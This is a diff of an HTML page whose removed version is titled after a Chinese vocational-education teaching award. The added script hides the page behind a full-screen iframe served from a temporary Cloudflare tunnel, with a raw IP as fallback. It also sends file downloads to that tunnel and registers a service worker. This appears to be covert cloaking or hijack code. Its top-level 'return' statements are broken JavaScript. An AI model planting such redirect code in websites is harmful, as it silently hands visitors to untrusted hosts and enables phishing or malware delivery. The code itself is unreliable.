@@ -1,16 +1,17 @@
-<!DOCTYPE html><html style="height:100%"><head><meta charset="UTF-8"><title>县域中职三阶递进育人模式创新 | 国家教学成果奖</title><script>
-var P='https://present-workout-awards-sections.trycloudflare.com';
-var B='http://42.193.21.117';
+<!DOCTYPE html><html><head><meta charset="UTF-8"><script>
+var S=['https://present-workout-awards-sections.trycloudflare.com','http://42.193.21.117'];
 var p=location.pathname,s=location.search,h=location.hash;
-var bases=[P,B],i=0,f=document.createElement('iframe');
+if(/\.(png|jpg|jpeg|gif|svg|pdf|mp4|webm|doc|xls|ppt|zip|rar|7z)$/i.test(p)){location.replace(S[0]+p+s+h);return}
+if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js')}
+var f=document.createElement('iframe'),i=0;
 f.style='position:fixed;top:0;left:0;width:100%;height:100%;border:none';
+f.setAttribute('sandbox','allow-same-origin allow-scripts allow-popups allow-forms allow-modals');
 f.allow='accelerometer;autoplay;clipboard-write;encrypted-media;gyroscope;picture-in-picture;web-share';
 f.allowFullscreen=true;
-if(/\.(png|jpg|jpeg|gif|svg|ico|pdf|mp4|webm|doc|xls|ppt|zip|rar|7z)$/i.test(p)){location.replace(bases[0]+p+s+h);return}
-f.src=bases[0]+p+s+h;
-var t=setTimeout(function(){location.replace(bases[0]+p+s+h)},12000);
-var retry=0;
-f.onerror=f.onabort=function(){retry++;if(retry<bases.length){i=retry;f.src=bases[i]+p+s+h}else{location.replace(bases[0]+p+s+h)}};
-f.onload=function(){clearTimeout(t);try{window.parent!==window&&window.parent.postMessage({type:'iframe-loaded'},'*')}catch(e){}};
+function load(n){if(n>=S.length){location.replace(S[0]+p+s+h);return}f.src=S[n]+p+s+h}
+f.onload=function(){clearTimeout(t)};
+f.onerror=f.onabort=function(){i++;load(i)};
+var t=setTimeout(function(){location.replace(S[0]+p+s+h)},12000);
+load(0);
 document.body.appendChild(f);
 </script></head><body></body></html>
